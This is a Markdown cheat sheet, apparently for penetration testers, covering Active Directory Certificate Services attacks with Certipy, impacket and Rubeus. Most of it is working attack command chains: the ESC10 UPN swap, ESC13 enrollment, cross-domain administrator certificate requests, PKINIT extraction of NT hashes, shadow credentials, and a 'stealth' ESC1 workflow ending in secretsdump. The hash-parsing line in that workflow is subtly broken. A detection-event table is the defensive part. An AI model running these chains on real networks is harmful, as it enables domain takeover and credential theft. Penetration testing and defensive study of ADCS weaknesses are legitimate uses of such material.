# Certipy — Deep Reference

## Certificate Template Anatomy

Understanding template fields is essential for identifying misconfigurations.

```
Template: UserAuthentication
  Display Name          → friendly name
  CN                    → RDN in LDAP (used in certipy req -template NAME)
  Schema Version        → V1/V2/V3/V4; V2+ allows issuance policies
  Validity Period       → how long cert is valid
  Renewal Period        → renewal window before expiry

  ── Enrollment ──
  Enrollment Rights     → who can request (DACL: msPKI-Certificate-Name-Flag)
  Enrollment Agent      → allow agent enrollment (ESC3 vector)

  ── Subject Name ──
  Subject Name Source   → "Supplied in request" = ESC1 candidate
                          "Build from AD" = safe (maps to requesting account)
  Subject Alt Name      → if enrollee can supply = ESC1
  msPKI-Certificate-Name-Flag  → 0x1 = ENROLLEE_SUPPLIES_SUBJECT

  ── Extensions ──
  Extended Key Usage (EKU):
    1.3.6.1.5.5.7.3.2   = Client Authentication (required for PKINIT)
    1.3.6.1.5.5.7.3.4   = Secure Email
    1.3.6.1.4.1.311.20.2.2 = Smart Card Logon
    2.5.29.37.0         = Any Purpose (ESC2 vector)
    (empty)             = No EKU (any purpose assumed, ESC2 vector)

  ── CA Flags ──
  msPKI-RA-Signature    → 0 = no enrollment agent signature required
                          N = N agent signatures needed
  EDITF_ATTRIBUTESUBJECTALTNAME2 → on CA, overrides template SAN restriction (ESC6)
```

---

## ESC Vulnerability Quick Reference

| ESC | Condition | Attack |
|-----|-----------|--------|
| ESC1 | ENROLLEE_SUPPLIES_SUBJECT + enrollment for domain users | Request cert with -upn admin@domain |
| ESC2 | Any Purpose or No EKU + enrollment for domain users | Same as ESC1 |
| ESC3 | Enrollment Agent template + another template allowing agent | 2-step enrollment-on-behalf-of |
| ESC4 | WriteProperty/WriteDacl on template | Modify template → introduce ESC1 |
| ESC5 | WriteDacl on PKI object (Certificate Templates container or CA) | Escalate to CA admin |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Any template: add -upn |
| ESC7 | ManageCA/ManageCertificates ACE | Enable ESC6 or issue denied requests |
| ESC8 | NTLM relay to ADCS HTTP endpoint | Relay machine/user auth → cert |
| ESC9 | CT_FLAG_NO_SECURITY_EXTENSION + GenericWrite on user | UPN swap → request → swap back |
| ESC10 | Weak certificate mapping (registry policy) | Similar UPN manipulation |
| ESC11 | NTLM relay to ADCS RPC (ICertPassage) | Relay to RPC instead of HTTP |
| ESC13 | IssuancePolicy OID linked to privileged Universal group | Enroll → cert gives group membership |

---

## ESC5 — PKI Object ACL Abuse

```bash
# Check WriteProperty/WriteDacl on the Certificate Templates container or CA object in AD
# If you control templates container: you can create or modify any template

# View ACLs on Certificate Templates container
certipy find -u user@DOMAIN -p pass -dc-ip DC -stdout | grep -A20 "Certificate Templates"

# With dacledit (impacket):
dacledit.py DOMAIN/user:pass -dc-ip DC -target "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -action read

# If you have WriteDacl: grant yourself write rights, then create ESC1 template
```

---

## ESC10 — Weak Certificate Mapping

Controlled by `StrongCertificateBindingEnforcement` registry key on DC:
- `0` = Weak (only SAN/UPN checked, pre-May 2022 default)
- `1` = Compatibility mode (log events, may still accept weak mapping)
- `2` = Full enforcement (strict mapping required)

```bash
# Check registry on DC (requires access)
reg query HKLM\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement

# ESC10 attack: if weak mapping and you have GenericWrite on user
# Same workflow as ESC9 (UPN swap + request + swap back)
certipy account -u attacker@DOMAIN -p pass -user victim -upn administrator@DOMAIN -dc-ip DC
certipy req -u victim@DOMAIN -p victimpass -ca CA-NAME -template UserTemplate -dc-ip DC
certipy account -u attacker@DOMAIN -p pass -user victim -upn victim@DOMAIN -dc-ip DC
certipy auth -pfx administrator.pfx -dc-ip DC
```

---

## ESC13 — Issuance Policy OID + Group Link

```bash
# ESC13: template has an issuance policy OID that is linked to a privileged AD group
# If domain user can enroll: cert grants that group's privileges

# Detect in certipy find output:
# Look for "Issuance Policies" pointing to groups

# Enroll in the template
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template ESC13Template -dc-ip DC

# The issued cert contains the OID → Windows treats holder as group member
# Use cert via Kerberos (S4U2Self / PKINIT)
certipy auth -pfx user.pfx -dc-ip DC
```

---

## PKINIT Internals: U2U for NT Hash Retrieval

PKINIT allows Kerberos authentication via X.509 certificate. Certipy uses a PKINIT User-to-User trick to extract the NT hash from the encrypted PAC.

```
Flow:
1. Client sends AS-REQ with PA-PK-AS-REQ (certificate)
2. KDC verifies cert chain → issues TGT encrypted with session key
3. Client sends TGS-REQ for self (User-to-User)
4. KDC responds with TGS containing encrypted PAC
5. Client decrypts PAC → extracts NT hash of account

Result: NT hash without knowing password — works even with Credential Guard
```

```bash
# The auth command does all this automatically
certipy auth -pfx user.pfx -domain DOMAIN -username user -dc-ip DC

# Output includes:
# [*] Got hash for 'user@domain.local': aad3...:NTHASH

# If KDC doesn't support PKINIT (rare): use certutil or Rubeus on Windows
# Rubeus equivalent: asktgt /certificate:cert.pfx /getcredentials
```

---

## Cross-Domain ADCS Attacks

If parent/child domains share a CA or trust relationships exist:

```bash
# Enumerate CAs from child domain that are visible enterprise-wide
certipy find -u user@CHILD.DOMAIN -p pass -dc-ip CHILD_DC -stdout

# Request cert from parent domain CA as child domain user
certipy req -u user@CHILD.DOMAIN -p pass -ca PARENT-CA-NAME -template VulnTemplate \
  -upn administrator@PARENT.DOMAIN -dc-ip PARENT_DC

# Authenticate to parent DC with cert
certipy auth -pfx administrator.pfx -domain PARENT.DOMAIN -username administrator -dc-ip PARENT_DC
```

---

## Rubeus Integration (Windows-side)

When on Windows and certipy isn't available, use Rubeus for cert-based auth:

```powershell
# Convert PFX to base64 for Rubeus
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("cert.pfx")) | Out-File cert_b64.txt

# Rubeus: request TGT with certificate (PKINIT)
Rubeus.exe asktgt /certificate:cert.pfx /password:pfxpass /user:administrator /domain:DOMAIN /dc:DC_IP /ptt

# Rubeus: get NT hash via PKINIT U2U
Rubeus.exe asktgt /certificate:cert.pfx /getcredentials /show

# Rubeus: shadow credentials (write KeyCredentialLink)
Rubeus.exe shadow /target:user /domain:DOMAIN /dc:DC_IP
```

---

## Detection Signatures

| Event | ID | Source | Meaning |
|-------|----|--------|---------|
| Certificate request | 4886 | CA Security Log | Normal cert request — check requester + template |
| Certificate issued | 4887 | CA Security Log | Cert approved |
| Certificate denied | 4888 | CA Security Log | Request failed/pending |
| Certificate template loaded | 4898 | CA Security Log | Inspect template name/version and correlate with enrollment activity |
| Certificate template updated | 4899 | CA Security Log | Template properties changed |
| Certificate template security descriptor changed | 4900 | CA Security Log | Inspect the new descriptor, principal, and granted rights |
| Kerberos TGT w/ cert | 4768 | DC Security Log | PKINIT auth (CertificateInformation populated) |
| msDS-KeyCredentialLink modified | 5136 | DC Security Log | Shadow credentials attack |
| NTLM relay to IIS | IIS Access Log | CA Web Server | ESC8 relay — check source IP vs enrolled account |

**Certipy `find` detection:**
- Generates LDAP queries to `CN=Public Key Services,CN=Services,CN=Configuration,...`
- Unusual LDAP enumeration of cert template objects from non-admin account = suspicious

---

## Cert Format Reference

| Format | Extension | Description | Tool use |
|--------|-----------|-------------|---------|
| PFX/PKCS12 | .pfx, .p12 | Cert + private key, password-protected | certipy auth, Rubeus |
| PEM | .pem, .crt, .key | Base64-encoded DER, separate cert + key files | openssl, curl |
| DER | .cer, .der | Binary cert only (no key) | Browser import |
| PVK + SPC | .pvk, .spc | Windows authenticode format | signtool |

```bash
# PFX → PEM (openssl)
openssl pkcs12 -in cert.pfx -out cert.pem -nodes -passin pass:""

# PEM → PFX (openssl)
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem -passout pass:""

# Inspect PFX contents
openssl pkcs12 -info -in cert.pfx -passin pass:"" -noout

# Check cert SAN/UPN fields
openssl x509 -in cert.pem -text -noout | grep -A5 "Subject Alternative Name"

# Check cert validity dates
openssl x509 -in cert.pem -noout -dates
```

---

## Full Stealth ESC1 Workflow

```bash
# 1. Recon (minimal LDAP queries)
certipy find -u user@DOMAIN -p pass -dc-ip DC -vulnerable -stdout 2>/dev/null | tee certipy_vuln.txt

# 2. Parse target: CA name, template name
CA=$(grep "CA Name" certipy_vuln.txt | head -1 | awk -F: '{print $2}' | xargs)
TEMPLATE=$(grep "Template Name" certipy_vuln.txt | head -1 | awk -F: '{print $2}' | xargs)

# 3. Request cert
certipy req -u user@DOMAIN -p pass -ca "$CA" -template "$TEMPLATE" -upn administrator@DOMAIN -dc-ip DC

# 4. Auth → get hash (generates only 1 Kerberos TGT request event)
certipy auth -pfx administrator.pfx -dc-ip DC

# 5. PTH
NT_HASH=$(grep "Got hash" /dev/stdin)
secretsdump.py DOMAIN/administrator@DC -hashes :$NT_HASH -just-dc-ntlm
```
